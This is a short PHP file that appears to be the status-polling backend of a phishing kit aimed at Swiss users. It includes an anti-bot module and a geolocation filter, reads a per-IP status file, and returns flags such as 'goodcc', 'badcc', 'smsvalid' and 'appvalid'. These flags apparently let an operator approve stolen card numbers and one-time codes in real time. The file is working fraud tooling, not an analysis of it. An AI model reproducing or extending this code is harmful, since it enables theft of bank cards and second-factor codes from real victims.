<?php
session_start();
include __DIR__ . '/antibot.php';

// Check geolocation - only allow Swiss and neighboring countries
checkGeolocation();

header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store');

$userIP     = getClientIP();
$ipListFile = __DIR__ . '/security_check/ip_list.txt';

if (!$userIP || !file_exists($ipListFile)) exit();

$lines = file($ipListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if ($lines === false) exit();

for ($i = count($lines) - 1; $i >= 0; $i--) {
    $line = $lines[$i];
    if (strpos($line, $userIP . ',') !== false) {
        if (strpos($line, ',waiting')  !== false) { break; }
        if (strpos($line, ',showcode') !== false) { echo 'showcode'; exit(); }
        if (strpos($line, ',goodcc')   !== false) { echo 'goodcc';   exit(); }
        if (strpos($line, ',badcc')    !== false) { echo 'badcc';    exit(); }
        if (strpos($line, ',appvalid') !== false) { echo 'appvalid'; exit(); }
        if (strpos($line, ',appbad')   !== false) { echo 'appbad';   exit(); }
        if (strpos($line, ',smsvalid') !== false) { echo 'smsvalid'; exit(); }
        if (strpos($line, ',smsbad')   !== false) { echo 'smsbad';   exit(); }
        break;
    }
}
